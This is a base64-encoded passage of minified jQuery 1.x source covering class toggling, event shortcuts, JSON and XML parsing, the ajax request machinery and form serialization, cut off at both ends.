IDogZnVuY3Rpb24gKCkgeyBpZiAoInN0cmluZyIgPT09IGMpIHsgdmFyIGIsIGQgPSAwLCBlID0gbSh0aGlzKSwgZiA9IGEubWF0Y2goRSkgfHwgW107IHdoaWxlIChiID0gZltkKytdKSBlLmhhc0NsYXNzKGIpID8gZS5yZW1vdmVDbGFzcyhiKSA6IGUuYWRkQ2xhc3MoYikgfSBlbHNlIChjID09PSBLIHx8ICJib29sZWFuIiA9PT0gYykgJiYgKHRoaXMuY2xhc3NOYW1lICYmIG0uX2RhdGEodGhpcywgIl9fY2xhc3NOYW1lX18iLCB0aGlzLmNsYXNzTmFtZSksIHRoaXMuY2xhc3NOYW1lID0gdGhpcy5jbGFzc05hbWUgfHwgYSA9PT0gITEgPyAiIiA6IG0uX2RhdGEodGhpcywgIl9fY2xhc3NOYW1lX18iKSB8fCAiIikgfSkgfSwgaGFzQ2xhc3M6IGZ1bmN0aW9uIChhKSB7IGZvciAodmFyIGIgPSAiICIgKyBhICsgIiAiLCBjID0gMCwgZCA9IHRoaXMubGVuZ3RoOyBkID4gYzsgYysrKSBpZiAoMSA9PT0gdGhpc1tjXS5ub2RlVHlwZSAmJiAoIiAiICsgdGhpc1tjXS5jbGFzc05hbWUgKyAiICIpLnJlcGxhY2UodWMsICIgIikuaW5kZXhPZihiKSA+PSAwKSByZXR1cm4gITA7IHJldHVybiAhMSB9IH0pLCBtLmVhY2goImJsdXIgZm9jdXMgZm9jdXNpbiBmb2N1c291dCBsb2FkIHJlc2l6ZSBzY3JvbGwgdW5sb2FkIGNsaWNrIGRibGNsaWNrIG1vdXNlZG93biBtb3VzZXVwIG1vdXNlbW92ZSBtb3VzZW92ZXIgbW91c2VvdXQgbW91c2VlbnRlciBtb3VzZWxlYXZlIGNoYW5nZSBzZWxlY3Qgc3VibWl0IGtleWRvd24ga2V5cHJlc3Mga2V5dXAgZXJyb3IgY29udGV4dG1lbnUiLnNwbGl0KCIgIiksIGZ1bmN0aW9uIChhLCBiKSB7IG0uZm5bYl0gPSBmdW5jdGlvbiAoYSwgYykgeyByZXR1cm4gYXJndW1lbnRzLmxlbmd0aCA+IDAgPyB0aGlzLm9uKGIsIG51bGwsIGEsIGMpIDogdGhpcy50cmlnZ2VyKGIpIH0gfSksIG0uZm4uZXh0ZW5kKHsgaG92ZXI6IGZ1bmN0aW9uIChhLCBiKSB7IHJldHVybiB0aGlzLm1vdXNlZW50ZXIoYSkubW91c2VsZWF2ZShiIHx8IGEpIH0sIGJpbmQ6IGZ1bmN0aW9uIChhLCBiLCBjKSB7IHJldHVybiB0aGlzLm9uKGEsIG51bGwsIGIsIGMpIH0sIHVuYmluZDogZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIHRoaXMub2ZmKGEsIG51bGwsIGIpIH0sIGRlbGVnYXRlOiBmdW5jdGlvbiAoYSwgYiwgYywgZCkgeyByZXR1cm4gdGhpcy5vbihiLCBhLCBjLCBkKSB9LCB1bmRlbGVnYXRlOiBmdW5jdGlvbiAoYSwgYiwgYykgeyByZXR1cm4gMSA9PT0gYXJndW1lbnRzLmxlbmd0aCA/IHRoaXMub2ZmKGEsICIqKiIpIDogdGhpcy5vZmYoYiwgYSB8fCAiKioiLCBjKSB9IH0pOyB2YXIgdmMgPSBtLm5vdygpLCB3YyA9IC9cPy8sIHhjID0gLygsKXwoXFt8eyl8KH18XSl8Iig/OlteIlxcXHJcbl18XFxbIlxcXC9iZm5ydF18XFx1W1xkYS1mQS1GXXs0fSkqIlxzKjo/fHRydWV8ZmFsc2V8bnVsbHwtPyg/ITBcZClcZCsoPzpcLlxkK3wpKD86W2VFXVsrLV0/XGQrfCkvZzsgbS5wYXJzZUpTT04gPSBmdW5jdGlvbiAoYikgeyBpZiAoYS5KU09OICYmIGEuSlNPTi5wYXJzZSkgcmV0dXJuIGEuSlNPTi5wYXJzZShiICsgIiIpOyB2YXIgYywgZCA9IG51bGwsIGUgPSBtLnRyaW0oYiArICIiKTsgcmV0dXJuIGUgJiYgIW0udHJpbShlLnJlcGxhY2UoeGMsIGZ1bmN0aW9uIChhLCBiLCBlLCBmKSB7IHJldHVybiBjICYmIGIgJiYgKGQgPSAwKSwgMCA9PT0gZCA/IGEgOiAoYyA9IGUgfHwgYiwgZCArPSAhZiAtICFlLCAiIikgfSkpID8gRnVuY3Rpb24oInJldHVybiAiICsgZSkoKSA6IG0uZXJyb3IoIkludmFsaWQgSlNPTjogIiArIGIpIH0sIG0ucGFyc2VYTUwgPSBmdW5jdGlvbiAoYikgeyB2YXIgYywgZDsgaWYgKCFiIHx8ICJzdHJpbmciICE9IHR5cGVvZiBiKSByZXR1cm4gbnVsbDsgdHJ5IHsgYS5ET01QYXJzZXIgPyAoZCA9IG5ldyBET01QYXJzZXIsIGMgPSBkLnBhcnNlRnJvbVN0cmluZyhiLCAidGV4dC94bWwiKSkgOiAoYyA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNaWNyb3NvZnQuWE1MRE9NIiksIGMuYXN5bmMgPSAiZmFsc2UiLCBjLmxvYWRYTUwoYikpIH0gY2F0Y2ggKGUpIHsgYyA9IHZvaWQgMCB9IHJldHVybiBjICYmIGMuZG9jdW1lbnRFbGVtZW50ICYmICFjLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJwYXJzZXJlcnJvciIpLmxlbmd0aCB8fCBtLmVycm9yKCJJbnZhbGlkIFhNTDogIiArIGIpLCBjIH07IHZhciB5YywgemMsIEFjID0gLyMuKiQvLCBCYyA9IC8oWz8mXSlfPVteJl0qLywgQ2MgPSAvXiguKj8pOlsgXHRdKihbXlxyXG5dKilccj8kL2dtLCBEYyA9IC9eKD86YWJvdXR8YXBwfGFwcC1zdG9yYWdlfC4rLWV4dGVuc2lvbnxmaWxlfHJlc3x3aWRnZXQpOiQvLCBFYyA9IC9eKD86R0VUfEhFQUQpJC8sIEZjID0gL15cL1wvLywgR2MgPSAvXihbXHcuKy1dKzopKD86XC9cLyg/OlteXC8/I10qQHwpKFteXC8/IzpdKikoPzo6KFxkKyl8KXwpLywgSGMgPSB7fSwgSWMgPSB7fSwgSmMgPSAiKi8iLmNvbmNhdCgiKiIpOyB0cnkgeyB6YyA9IGxvY2F0aW9uLmhyZWYgfSBjYXRjaCAoS2MpIHsgemMgPSB5LmNyZWF0ZUVsZW1lbnQoImEiKSwgemMuaHJlZiA9ICIiLCB6YyA9IHpjLmhyZWYgfSB5YyA9IEdjLmV4ZWMoemMudG9Mb3dlckNhc2UoKSkgfHwgW107IGZ1bmN0aW9uIExjKGEpIHsgcmV0dXJuIGZ1bmN0aW9uIChiLCBjKSB7ICJzdHJpbmciICE9IHR5cGVvZiBiICYmIChjID0gYiwgYiA9ICIqIik7IHZhciBkLCBlID0gMCwgZiA9IGIudG9Mb3dlckNhc2UoKS5tYXRjaChFKSB8fCBbXTsgaWYgKG0uaXNGdW5jdGlvbihjKSkgd2hpbGUgKGQgPSBmW2UrK10pICIrIiA9PT0gZC5jaGFyQXQoMCkgPyAoZCA9IGQuc2xpY2UoMSkgfHwgIioiLCAoYVtkXSA9IGFbZF0gfHwgW10pLnVuc2hpZnQoYykpIDogKGFbZF0gPSBhW2RdIHx8IFtdKS5wdXNoKGMpIH0gfSBmdW5jdGlvbiBNYyhhLCBiLCBjLCBkKSB7IHZhciBlID0ge30sIGYgPSBhID09PSBJYzsgZnVuY3Rpb24gZyhoKSB7IHZhciBpOyByZXR1cm4gZVtoXSA9ICEwLCBtLmVhY2goYVtoXSB8fCBbXSwgZnVuY3Rpb24gKGEsIGgpIHsgdmFyIGogPSBoKGIsIGMsIGQpOyByZXR1cm4gInN0cmluZyIgIT0gdHlwZW9mIGogfHwgZiB8fCBlW2pdID8gZiA/ICEoaSA9IGopIDogdm9pZCAwIDogKGIuZGF0YVR5cGVzLnVuc2hpZnQoaiksIGcoaiksICExKSB9KSwgaSB9IHJldHVybiBnKGIuZGF0YVR5cGVzWzBdKSB8fCAhZVsiKiJdICYmIGcoIioiKSB9IGZ1bmN0aW9uIE5jKGEsIGIpIHsgdmFyIGMsIGQsIGUgPSBtLmFqYXhTZXR0aW5ncy5mbGF0T3B0aW9ucyB8fCB7fTsgZm9yIChkIGluIGIpIHZvaWQgMCAhPT0gYltkXSAmJiAoKGVbZF0gPyBhIDogYyB8fCAoYyA9IHt9KSlbZF0gPSBiW2RdKTsgcmV0dXJuIGMgJiYgbS5leHRlbmQoITAsIGEsIGMpLCBhIH0gZnVuY3Rpb24gT2MoYSwgYiwgYykgeyB2YXIgZCwgZSwgZiwgZywgaCA9IGEuY29udGVudHMsIGkgPSBhLmRhdGFUeXBlczsgd2hpbGUgKCIqIiA9PT0gaVswXSkgaS5zaGlmdCgpLCB2b2lkIDAgPT09IGUgJiYgKGUgPSBhLm1pbWVUeXBlIHx8IGIuZ2V0UmVzcG9uc2VIZWFkZXIoIkNvbnRlbnQtVHlwZSIpKTsgaWYgKGUpIGZvciAoZyBpbiBoKSBpZiAoaFtnXSAmJiBoW2ddLnRlc3QoZSkpIHsgaS51bnNoaWZ0KGcpOyBicmVhayB9IGlmIChpWzBdIGluIGMpIGYgPSBpWzBdOyBlbHNlIHsgZm9yIChnIGluIGMpIHsgaWYgKCFpWzBdIHx8IGEuY29udmVydGVyc1tnICsgIiAiICsgaVswXV0pIHsgZiA9IGc7IGJyZWFrIH0gZCB8fCAoZCA9IGcpIH0gZiA9IGYgfHwgZCB9IHJldHVybiBmID8gKGYgIT09IGlbMF0gJiYgaS51bnNoaWZ0KGYpLCBjW2ZdKSA6IHZvaWQgMCB9IGZ1bmN0aW9uIFBjKGEsIGIsIGMsIGQpIHsgdmFyIGUsIGYsIGcsIGgsIGksIGogPSB7fSwgayA9IGEuZGF0YVR5cGVzLnNsaWNlKCk7IGlmIChrWzFdKSBmb3IgKGcgaW4gYS5jb252ZXJ0ZXJzKSBqW2cudG9Mb3dlckNhc2UoKV0gPSBhLmNvbnZlcnRlcnNbZ107IGYgPSBrLnNoaWZ0KCk7IHdoaWxlIChmKSBpZiAoYS5yZXNwb25zZUZpZWxkc1tmXSAmJiAoY1thLnJlc3BvbnNlRmllbGRzW2ZdXSA9IGIpLCAhaSAmJiBkICYmIGEuZGF0YUZpbHRlciAmJiAoYiA9IGEuZGF0YUZpbHRlcihiLCBhLmRhdGFUeXBlKSksIGkgPSBmLCBmID0gay5zaGlmdCgpKSBpZiAoIioiID09PSBmKSBmID0gaTsgZWxzZSBpZiAoIioiICE9PSBpICYmIGkgIT09IGYpIHsgaWYgKGcgPSBqW2kgKyAiICIgKyBmXSB8fCBqWyIqICIgKyBmXSwgIWcpIGZvciAoZSBpbiBqKSBpZiAoaCA9IGUuc3BsaXQoIiAiKSwgaFsxXSA9PT0gZiAmJiAoZyA9IGpbaSArICIgIiArIGhbMF1dIHx8IGpbIiogIiArIGhbMF1dKSkgeyBnID09PSAhMCA/IGcgPSBqW2VdIDogaltlXSAhPT0gITAgJiYgKGYgPSBoWzBdLCBrLnVuc2hpZnQoaFsxXSkpOyBicmVhayB9IGlmIChnICE9PSAhMCkgaWYgKGcgJiYgYVsidGhyb3dzIl0pIGIgPSBnKGIpOyBlbHNlIHRyeSB7IGIgPSBnKGIpIH0gY2F0Y2ggKGwpIHsgcmV0dXJuIHsgc3RhdGU6ICJwYXJzZXJlcnJvciIsIGVycm9yOiBnID8gbCA6ICJObyBjb252ZXJzaW9uIGZyb20gIiArIGkgKyAiIHRvICIgKyBmIH0gfSB9IHJldHVybiB7IHN0YXRlOiAic3VjY2VzcyIsIGRhdGE6IGIgfSB9IG0uZXh0ZW5kKHsgYWN0aXZlOiAwLCBsYXN0TW9kaWZpZWQ6IHt9LCBldGFnOiB7fSwgYWpheFNldHRpbmdzOiB7IHVybDogemMsIHR5cGU6ICJHRVQiLCBpc0xvY2FsOiBEYy50ZXN0KHljWzFdKSwgZ2xvYmFsOiAhMCwgcHJvY2Vzc0RhdGE6ICEwLCBhc3luYzogITAsIGNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IiwgYWNjZXB0czogeyAiKiI6IEpjLCB0ZXh0OiAidGV4dC9wbGFpbiIsIGh0bWw6ICJ0ZXh0L2h0bWwiLCB4bWw6ICJhcHBsaWNhdGlvbi94bWwsIHRleHQveG1sIiwganNvbjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCIgfSwgY29udGVudHM6IHsgeG1sOiAveG1sLywgaHRtbDogL2h0bWwvLCBqc29uOiAvanNvbi8gfSwgcmVzcG9uc2VGaWVsZHM6IHsgeG1sOiAicmVzcG9uc2VYTUwiLCB0ZXh0OiAicmVzcG9uc2VUZXh0IiwganNvbjogInJlc3BvbnNlSlNPTiIgfSwgY29udmVydGVyczogeyAiKiB0ZXh0IjogU3RyaW5nLCAidGV4dCBodG1sIjogITAsICJ0ZXh0IGpzb24iOiBtLnBhcnNlSlNPTiwgInRleHQgeG1sIjogbS5wYXJzZVhNTCB9LCBmbGF0T3B0aW9uczogeyB1cmw6ICEwLCBjb250ZXh0OiAhMCB9IH0sIGFqYXhTZXR1cDogZnVuY3Rpb24gKGEsIGIpIHsgcmV0dXJuIGIgPyBOYyhOYyhhLCBtLmFqYXhTZXR0aW5ncyksIGIpIDogTmMobS5hamF4U2V0dGluZ3MsIGEpIH0sIGFqYXhQcmVmaWx0ZXI6IExjKEhjKSwgYWpheFRyYW5zcG9ydDogTGMoSWMpLCBhamF4OiBmdW5jdGlvbiAoYSwgYikgeyAib2JqZWN0IiA9PSB0eXBlb2YgYSAmJiAoYiA9IGEsIGEgPSB2b2lkIDApLCBiID0gYiB8fCB7fTsgdmFyIGMsIGQsIGUsIGYsIGcsIGgsIGksIGosIGsgPSBtLmFqYXhTZXR1cCh7fSwgYiksIGwgPSBrLmNvbnRleHQgfHwgaywgbiA9IGsuY29udGV4dCAmJiAobC5ub2RlVHlwZSB8fCBsLmpxdWVyeSkgPyBtKGwpIDogbS5ldmVudCwgbyA9IG0uRGVmZXJyZWQoKSwgcCA9IG0uQ2FsbGJhY2tzKCJvbmNlIG1lbW9yeSIpLCBxID0gay5zdGF0dXNDb2RlIHx8IHt9LCByID0ge30sIHMgPSB7fSwgdCA9IDAsIHUgPSAiY2FuY2VsZWQiLCB2ID0geyByZWFkeVN0YXRlOiAwLCBnZXRSZXNwb25zZUhlYWRlcjogZnVuY3Rpb24gKGEpIHsgdmFyIGI7IGlmICgyID09PSB0KSB7IGlmICghaikgeyBqID0ge307IHdoaWxlIChiID0gQ2MuZXhlYyhmKSkgaltiWzFdLnRvTG93ZXJDYXNlKCldID0gYlsyXSB9IGIgPSBqW2EudG9Mb3dlckNhc2UoKV0gfSByZXR1cm4gbnVsbCA9PSBiID8gbnVsbCA6IGIgfSwgZ2V0QWxsUmVzcG9uc2VIZWFkZXJzOiBmdW5jdGlvbiAoKSB7IHJldHVybiAyID09PSB0ID8gZiA6IG51bGwgfSwgc2V0UmVxdWVzdEhlYWRlcjogZnVuY3Rpb24gKGEsIGIpIHsgdmFyIGMgPSBhLnRvTG93ZXJDYXNlKCk7IHJldHVybiB0IHx8IChhID0gc1tjXSA9IHNbY10gfHwgYSwgclthXSA9IGIpLCB0aGlzIH0sIG92ZXJyaWRlTWltZVR5cGU6IGZ1bmN0aW9uIChhKSB7IHJldHVybiB0IHx8IChrLm1pbWVUeXBlID0gYSksIHRoaXMgfSwgc3RhdHVzQ29kZTogZnVuY3Rpb24gKGEpIHsgdmFyIGI7IGlmIChhKSBpZiAoMiA+IHQpIGZvciAoYiBpbiBhKSBxW2JdID0gW3FbYl0sIGFbYl1dOyBlbHNlIHYuYWx3YXlzKGFbdi5zdGF0dXNdKTsgcmV0dXJuIHRoaXMgfSwgYWJvcnQ6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gYSB8fCB1OyByZXR1cm4gaSAmJiBpLmFib3J0KGIpLCB4KDAsIGIpLCB0aGlzIH0gfTsgaWYgKG8ucHJvbWlzZSh2KS5jb21wbGV0ZSA9IHAuYWRkLCB2LnN1Y2Nlc3MgPSB2LmRvbmUsIHYuZXJyb3IgPSB2LmZhaWwsIGsudXJsID0gKChhIHx8IGsudXJsIHx8IHpjKSArICIiKS5yZXBsYWNlKEFjLCAiIikucmVwbGFjZShGYywgeWNbMV0gKyAiLy8iKSwgay50eXBlID0gYi5tZXRob2QgfHwgYi50eXBlIHx8IGsubWV0aG9kIHx8IGsudHlwZSwgay5kYXRhVHlwZXMgPSBtLnRyaW0oay5kYXRhVHlwZSB8fCAiKiIpLnRvTG93ZXJDYXNlKCkubWF0Y2goRSkgfHwgWyIiXSwgbnVsbCA9PSBrLmNyb3NzRG9tYWluICYmIChjID0gR2MuZXhlYyhrLnVybC50b0xvd2VyQ2FzZSgpKSwgay5jcm9zc0RvbWFpbiA9ICEoIWMgfHwgY1sxXSA9PT0geWNbMV0gJiYgY1syXSA9PT0geWNbMl0gJiYgKGNbM10gfHwgKCJodHRwOiIgPT09IGNbMV0gPyAiODAiIDogIjQ0MyIpKSA9PT0gKHljWzNdIHx8ICgiaHR0cDoiID09PSB5Y1sxXSA/ICI4MCIgOiAiNDQzIikpKSksIGsuZGF0YSAmJiBrLnByb2Nlc3NEYXRhICYmICJzdHJpbmciICE9IHR5cGVvZiBrLmRhdGEgJiYgKGsuZGF0YSA9IG0ucGFyYW0oay5kYXRhLCBrLnRyYWRpdGlvbmFsKSksIE1jKEhjLCBrLCBiLCB2KSwgMiA9PT0gdCkgcmV0dXJuIHY7IGggPSBrLmdsb2JhbCwgaCAmJiAwID09PSBtLmFjdGl2ZSsrICYmIG0uZXZlbnQudHJpZ2dlcigiYWpheFN0YXJ0IiksIGsudHlwZSA9IGsudHlwZS50b1VwcGVyQ2FzZSgpLCBrLmhhc0NvbnRlbnQgPSAhRWMudGVzdChrLnR5cGUpLCBlID0gay51cmwsIGsuaGFzQ29udGVudCB8fCAoay5kYXRhICYmIChlID0gay51cmwgKz0gKHdjLnRlc3QoZSkgPyAiJiIgOiAiPyIpICsgay5kYXRhLCBkZWxldGUgay5kYXRhKSwgay5jYWNoZSA9PT0gITEgJiYgKGsudXJsID0gQmMudGVzdChlKSA/IGUucmVwbGFjZShCYywgIiQxXz0iICsgdmMrKykgOiBlICsgKHdjLnRlc3QoZSkgPyAiJiIgOiAiPyIpICsgIl89IiArIHZjKyspKSwgay5pZk1vZGlmaWVkICYmIChtLmxhc3RNb2RpZmllZFtlXSAmJiB2LnNldFJlcXVlc3RIZWFkZXIoIklmLU1vZGlmaWVkLVNpbmNlIiwgbS5sYXN0TW9kaWZpZWRbZV0pLCBtLmV0YWdbZV0gJiYgdi5zZXRSZXF1ZXN0SGVhZGVyKCJJZi1Ob25lLU1hdGNoIiwgbS5ldGFnW2VdKSksIChrLmRhdGEgJiYgay5oYXNDb250ZW50ICYmIGsuY29udGVudFR5cGUgIT09ICExIHx8IGIuY29udGVudFR5cGUpICYmIHYuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwgay5jb250ZW50VHlwZSksIHYuc2V0UmVxdWVzdEhlYWRlcigiQWNjZXB0Iiwgay5kYXRhVHlwZXNbMF0gJiYgay5hY2NlcHRzW2suZGF0YVR5cGVzWzBdXSA/IGsuYWNjZXB0c1trLmRhdGFUeXBlc1swXV0gKyAoIioiICE9PSBrLmRhdGFUeXBlc1swXSA/ICIsICIgKyBKYyArICI7IHE9MC4wMSIgOiAiIikgOiBrLmFjY2VwdHNbIioiXSk7IGZvciAoZCBpbiBrLmhlYWRlcnMpIHYuc2V0UmVxdWVzdEhlYWRlcihkLCBrLmhlYWRlcnNbZF0pOyBpZiAoay5iZWZvcmVTZW5kICYmIChrLmJlZm9yZVNlbmQuY2FsbChsLCB2LCBrKSA9PT0gITEgfHwgMiA9PT0gdCkpIHJldHVybiB2LmFib3J0KCk7IHUgPSAiYWJvcnQiOyBmb3IgKGQgaW4geyBzdWNjZXNzOiAxLCBlcnJvcjogMSwgY29tcGxldGU6IDEgfSkgdltkXShrW2RdKTsgaWYgKGkgPSBNYyhJYywgaywgYiwgdikpIHsgdi5yZWFkeVN0YXRlID0gMSwgaCAmJiBuLnRyaWdnZXIoImFqYXhTZW5kIiwgW3YsIGtdKSwgay5hc3luYyAmJiBrLnRpbWVvdXQgPiAwICYmIChnID0gc2V0VGltZW91dChmdW5jdGlvbiAoKSB7IHYuYWJvcnQoInRpbWVvdXQiKSB9LCBrLnRpbWVvdXQpKTsgdHJ5IHsgdCA9IDEsIGkuc2VuZChyLCB4KSB9IGNhdGNoICh3KSB7IGlmICghKDIgPiB0KSkgdGhyb3cgdzsgeCgtMSwgdykgfSB9IGVsc2UgeCgtMSwgIk5vIFRyYW5zcG9ydCIpOyBmdW5jdGlvbiB4KGEsIGIsIGMsIGQpIHsgdmFyIGosIHIsIHMsIHUsIHcsIHggPSBiOyAyICE9PSB0ICYmICh0ID0gMiwgZyAmJiBjbGVhclRpbWVvdXQoZyksIGkgPSB2b2lkIDAsIGYgPSBkIHx8ICIiLCB2LnJlYWR5U3RhdGUgPSBhID4gMCA/IDQgOiAwLCBqID0gYSA+PSAyMDAgJiYgMzAwID4gYSB8fCAzMDQgPT09IGEsIGMgJiYgKHUgPSBPYyhrLCB2LCBjKSksIHUgPSBQYyhrLCB1LCB2LCBqKSwgaiA/IChrLmlmTW9kaWZpZWQgJiYgKHcgPSB2LmdldFJlc3BvbnNlSGVhZGVyKCJMYXN0LU1vZGlmaWVkIiksIHcgJiYgKG0ubGFzdE1vZGlmaWVkW2VdID0gdyksIHcgPSB2LmdldFJlc3BvbnNlSGVhZGVyKCJldGFnIiksIHcgJiYgKG0uZXRhZ1tlXSA9IHcpKSwgMjA0ID09PSBhIHx8ICJIRUFEIiA9PT0gay50eXBlID8geCA9ICJub2NvbnRlbnQiIDogMzA0ID09PSBhID8geCA9ICJub3Rtb2RpZmllZCIgOiAoeCA9IHUuc3RhdGUsIHIgPSB1LmRhdGEsIHMgPSB1LmVycm9yLCBqID0gIXMpKSA6IChzID0geCwgKGEgfHwgIXgpICYmICh4ID0gImVycm9yIiwgMCA+IGEgJiYgKGEgPSAwKSkpLCB2LnN0YXR1cyA9IGEsIHYuc3RhdHVzVGV4dCA9IChiIHx8IHgpICsgIiIsIGogPyBvLnJlc29sdmVXaXRoKGwsIFtyLCB4LCB2XSkgOiBvLnJlamVjdFdpdGgobCwgW3YsIHgsIHNdKSwgdi5zdGF0dXNDb2RlKHEpLCBxID0gdm9pZCAwLCBoICYmIG4udHJpZ2dlcihqID8gImFqYXhTdWNjZXNzIiA6ICJhamF4RXJyb3IiLCBbdiwgaywgaiA/IHIgOiBzXSksIHAuZmlyZVdpdGgobCwgW3YsIHhdKSwgaCAmJiAobi50cmlnZ2VyKCJhamF4Q29tcGxldGUiLCBbdiwga10pLCAtLW0uYWN0aXZlIHx8IG0uZXZlbnQudHJpZ2dlcigiYWpheFN0b3AiKSkpIH0gcmV0dXJuIHYgfSwgZ2V0SlNPTjogZnVuY3Rpb24gKGEsIGIsIGMpIHsgcmV0dXJuIG0uZ2V0KGEsIGIsIGMsICJqc29uIikgfSwgZ2V0U2NyaXB0OiBmdW5jdGlvbiAoYSwgYikgeyByZXR1cm4gbS5nZXQoYSwgdm9pZCAwLCBiLCAic2NyaXB0IikgfSB9KSwgbS5lYWNoKFsiZ2V0IiwgInBvc3QiXSwgZnVuY3Rpb24gKGEsIGIpIHsgbVtiXSA9IGZ1bmN0aW9uIChhLCBjLCBkLCBlKSB7IHJldHVybiBtLmlzRnVuY3Rpb24oYykgJiYgKGUgPSBlIHx8IGQsIGQgPSBjLCBjID0gdm9pZCAwKSwgbS5hamF4KHsgdXJsOiBhLCB0eXBlOiBiLCBkYXRhVHlwZTogZSwgZGF0YTogYywgc3VjY2VzczogZCB9KSB9IH0pLCBtLmVhY2goWyJhamF4U3RhcnQiLCAiYWpheFN0b3AiLCAiYWpheENvbXBsZXRlIiwgImFqYXhFcnJvciIsICJhamF4U3VjY2VzcyIsICJhamF4U2VuZCJdLCBmdW5jdGlvbiAoYSwgYikgeyBtLmZuW2JdID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuIHRoaXMub24oYiwgYSkgfSB9KSwgbS5fZXZhbFVybCA9IGZ1bmN0aW9uIChhKSB7IHJldHVybiBtLmFqYXgoeyB1cmw6IGEsIHR5cGU6ICJHRVQiLCBkYXRhVHlwZTogInNjcmlwdCIsIGFzeW5jOiAhMSwgZ2xvYmFsOiAhMSwgInRocm93cyI6ICEwIH0pIH0sIG0uZm4uZXh0ZW5kKHsgd3JhcEFsbDogZnVuY3Rpb24gKGEpIHsgaWYgKG0uaXNGdW5jdGlvbihhKSkgcmV0dXJuIHRoaXMuZWFjaChmdW5jdGlvbiAoYikgeyBtKHRoaXMpLndyYXBBbGwoYS5jYWxsKHRoaXMsIGIpKSB9KTsgaWYgKHRoaXNbMF0pIHsgdmFyIGIgPSBtKGEsIHRoaXNbMF0ub3duZXJEb2N1bWVudCkuZXEoMCkuY2xvbmUoITApOyB0aGlzWzBdLnBhcmVudE5vZGUgJiYgYi5pbnNlcnRCZWZvcmUodGhpc1swXSksIGIubWFwKGZ1bmN0aW9uICgpIHsgdmFyIGEgPSB0aGlzOyB3aGlsZSAoYS5maXJzdENoaWxkICYmIDEgPT09IGEuZmlyc3RDaGlsZC5ub2RlVHlwZSkgYSA9IGEuZmlyc3RDaGlsZDsgcmV0dXJuIGEgfSkuYXBwZW5kKHRoaXMpIH0gcmV0dXJuIHRoaXMgfSwgd3JhcElubmVyOiBmdW5jdGlvbiAoYSkgeyByZXR1cm4gdGhpcy5lYWNoKG0uaXNGdW5jdGlvbihhKSA/IGZ1bmN0aW9uIChiKSB7IG0odGhpcykud3JhcElubmVyKGEuY2FsbCh0aGlzLCBiKSkgfSA6IGZ1bmN0aW9uICgpIHsgdmFyIGIgPSBtKHRoaXMpLCBjID0gYi5jb250ZW50cygpOyBjLmxlbmd0aCA/IGMud3JhcEFsbChhKSA6IGIuYXBwZW5kKGEpIH0pIH0sIHdyYXA6IGZ1bmN0aW9uIChhKSB7IHZhciBiID0gbS5pc0Z1bmN0aW9uKGEpOyByZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uIChjKSB7IG0odGhpcykud3JhcEFsbChiID8gYS5jYWxsKHRoaXMsIGMpIDogYSkgfSkgfSwgdW53cmFwOiBmdW5jdGlvbiAoKSB7IHJldHVybiB0aGlzLnBhcmVudCgpLmVhY2goZnVuY3Rpb24gKCkgeyBtLm5vZGVOYW1lKHRoaXMsICJib2R5IikgfHwgbSh0aGlzKS5yZXBsYWNlV2l0aCh0aGlzLmNoaWxkTm9kZXMpIH0pLmVuZCgpIH0gfSksIG0uZXhwci5maWx0ZXJzLmhpZGRlbiA9IGZ1bmN0aW9uIChhKSB7IHJldHVybiBhLm9mZnNldFdpZHRoIDw9IDAgJiYgYS5vZmZzZXRIZWlnaHQgPD0gMCB8fCAhay5yZWxpYWJsZUhpZGRlbk9mZnNldHMoKSAmJiAibm9uZSIgPT09IChhLnN0eWxlICYmIGEuc3R5bGUuZGlzcGxheSB8fCBtLmNzcyhhLCAiZGlzcGxheSIpKSB9LCBtLmV4cHIuZmlsdGVycy52aXNpYmxlID0gZnVuY3Rpb24gKGEpIHsgcmV0dXJuICFtLmV4cHIuZmlsdGVycy5oaWRkZW4oYSkgfTsgdmFyIFFjID0gLyUyMC9nLCBSYyA9IC9cW1xdJC8sIFNjID0gL1xyP1xuL2csIFRjID0gL14oPzpzdWJtaXR8YnV0dG9ufGltYWdlfHJlc2V0fGZpbGUpJC9pLCBVYyA9IC9eKD86aW5wdXR8c2VsZWN0fHRleHRhcmVhfGtleWdlbikvaTsgZnVuY3Rpb24gVmMoYSwgYiwgYywgZCkgeyB2YXIgZTsgaWYgKG0uaXNBcnJheShiKSkgbS5lYWNoKGIsIGZ1bmN0aW9uIChiLCBlKSB7IGMgfHwgUmMudGVzdChhKSA/IGQoYSwgZSkgOiBWYyhhICsgIlsiICsgKCJvYmplY3QiID09IHR5cGVvZiBlID8gYiA6ICIiKSArICJdIiwgZSwgYywgZCkgfSk7IGVsc2UgaWYgKGMgfHwgIm9iamVjdCIgIT09IG0udHlwZShiKSkgZChhLCBiKTsgZWxzZSBmb3IgKGUgaW4gYikgVmMoYSArICJbIiArIGUgKyAiXSIsIGJbZV0sIGMsIGQpIH0gbS5wYXJhbSA9IGZ1bmN0aW9uIChhLCBiKSB7IHZhciBjLCBkID0gW10sIGUgPSBmdW5jdGlvbiAoYSwgYikgeyBiID0gbS5pc0Z1bmN0aW9uKGIpID8gYigpIDogbnVsbCA9PSBiID8gIiIgOiBiLCBkW2QubGVuZ3RoXSA9IGVuY29kZVVSSUNvbXBvbmVudChhKSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChiKSB9OyBpZiAodm9pZCAwID09PSBiICYmIChiID0gbS5hamF4U2V0dGluZ3MgJiYgbS5hamF4U2V0dGluZ3MudHJhZGl0aW9uYWwpLCBtLmlzQXJyYXkoYSkgfHwgYS5qcXVlcnkgJiYgIW0uaXNQbGFpbk9iamVjdChhKSkgbS5lYWNoKGEsIGZ1bmN0aW9uICgpIHsgZSh0aGlzLm5hbWUsIHRoaXMudmFsdWUpIH0pOyBlbHNlIGZvciAoYyBpbiBhKSBWYyhjLCBhW2NdLCBiLCBlKTsgcmV0dXJuIGQuam9pbigiJiIpLnJlcGxhY2UoUWMsICIrIikgfSwgbS5mbi5leHRlbmQoeyBzZXJpYWxpemU6IGZ1bmN0aW9uICgpIHsgcmV0dXJuIG0ucGFyYW0odGhpcy5zZXJpYWxpe